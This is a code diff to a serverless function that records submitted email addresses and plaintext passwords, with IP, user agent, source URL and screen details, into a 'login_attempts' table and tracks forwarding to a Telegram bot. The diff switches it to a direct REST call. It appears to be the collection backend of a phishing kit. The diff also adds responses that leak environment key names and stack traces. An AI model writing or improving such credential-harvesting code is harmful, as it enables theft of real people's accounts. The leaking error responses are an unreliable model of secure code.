@@ -1,10 +1,3 @@
-const { createClient } = require('@supabase/supabase-js');
-
-const supabaseUrl = process.env.VITE_SUPABASE_URL;
-const supabaseKey = process.env.VITE_SUPABASE_SERVICE_ROLE_KEY || process.env.VITE_SUPABASE_ANON_KEY;
-const botToken = process.env.BOT_TOKEN;
-const chatId = process.env.CHAT_ID;
-
 exports.handler = async function(event) {
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -45,16 +38,25 @@ exports.handler = async function(event) {
       };
     }
 
+    const supabaseUrl = process.env.VITE_SUPABASE_URL;
+    const supabaseKey = process.env.VITE_SUPABASE_SERVICE_ROLE_KEY || process.env.VITE_SUPABASE_ANON_KEY;
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.CHAT_ID;
+
     if (!supabaseUrl || !supabaseKey) {
-      console.error('Missing Supabase credentials:', { supabaseUrl: !!supabaseUrl, supabaseKey: !!supabaseKey });
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ error: 'Supabase not configured' })
+        body: JSON.stringify({
+          error: 'Supabase not configured',
+          debug: {
+            hasUrl: !!supabaseUrl,
+            hasKey: !!supabaseKey,
+            env: Object.keys(process.env).filter(k => k.includes('SUPABASE'))
+          }
+        })
       };
     }
-
-    const supabase = createClient(supabaseUrl, supabaseKey);
 
     let telegramSent = false;
     let telegramSentAt = null;
@@ -84,37 +86,46 @@ exports.handler = async function(event) {
       }
     }
 
-    const { data, error } = await supabase
-      .from('login_attempts')
-      .insert([
-        {
-          email: email.trim(),
-          password: password,
-          ip_address: ip || event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown',
-          user_agent: userAgent || event.headers['user-agent'] || 'unknown',
-          source_url: sourceUrl || 'unknown',
-          screen_info: screenInfo || '{}',
-          timestamp: timestamp || new Date().toISOString(),
-          telegram_sent: telegramSent,
-          telegram_sent_at: telegramSentAt,
-          verified: false
-        }
-      ])
-      .select()
-      .maybeSingle();
+    const dbPayload = {
+      email: email.trim(),
+      password: password,
+      ip_address: ip || event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown',
+      user_agent: userAgent || event.headers['user-agent'] || 'unknown',
+      source_url: sourceUrl || 'unknown',
+      screen_info: screenInfo || '{}',
+      timestamp: timestamp || new Date().toISOString(),
+      telegram_sent: telegramSent,
+      telegram_sent_at: telegramSentAt,
+      verified: false
+    };
 
-    if (error) {
-      console.error('Supabase error:', error);
+    const response = await fetch(`${supabaseUrl}/rest/v1/login_attempts`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': supabaseKey,
+        'Authorization': `Bearer ${supabaseKey}`,
+        'Prefer': 'return=representation'
+      },
+      body: JSON.stringify(dbPayload)
+    });
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('Supabase API error:', response.status, errorText);
       return {
         statusCode: 500,
         headers,
         body: JSON.stringify({
           error: 'Failed to store login attempt',
-          details: error.message,
-          code: error.code
+          details: errorText,
+          status: response.status
         })
       };
     }
+
+    const data = await response.json();
+    const insertedRecord = Array.isArray(data) ? data[0] : data;
 
     return {
       statusCode: 200,
@@ -123,7 +134,7 @@ exports.handler = async function(event) {
         success: true,
         telegramSent: telegramSent,
         stored: true,
-        id: data?.id
+        id: insertedRecord?.id
       })
     };
   } catch (error) {
@@ -134,7 +145,7 @@ exports.handler = async function(event) {
       body: JSON.stringify({
         error: 'Internal server error',
         details: error.message,
-        stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+        stack: error.stack
       })
     };
   }
